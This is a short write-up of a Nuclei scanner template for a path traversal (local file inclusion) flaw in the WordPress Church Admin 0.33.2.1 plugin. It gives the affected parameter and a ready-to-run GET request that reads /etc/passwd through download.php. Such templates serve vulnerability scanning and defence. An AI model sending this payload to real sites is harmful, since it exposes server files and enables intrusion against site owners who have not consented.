# Nuclei Template: WordPress Church Admin 0.33.2.1 - Local File Inclusion
**Template ID:** church-admin-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`church-admin-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the "key" parameter of plugins/church-admin/display/download.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd
```

## References
- https://wpscan.com/vulnerability/8997
- https://id.wordpress.org/plugins/church-admin/
